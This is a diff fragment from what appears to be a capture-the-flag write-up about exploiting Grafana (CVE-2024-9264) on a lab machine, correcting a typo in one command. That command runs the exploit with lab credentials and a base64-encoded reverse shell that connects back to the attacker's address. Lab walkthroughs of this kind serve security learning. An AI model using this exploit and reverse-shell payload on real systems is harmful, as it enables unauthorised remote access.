@@ -55,7 +55,7 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MS80NDQ0IDA+JjEK
 ```
 - After running the next command I get the reverse shell:
 ```shell
-python33 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MS80NDQ0IDA+JjEK | base64 -d | bash" http://grafana.planning.htb"
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MS80NDQ0IDA+JjEK | base64 -d | bash" http://grafana.planning.htb"
 ```
 - Now that I have access let's go through the user contents![[Pasted image 20250727141828.png]]
 
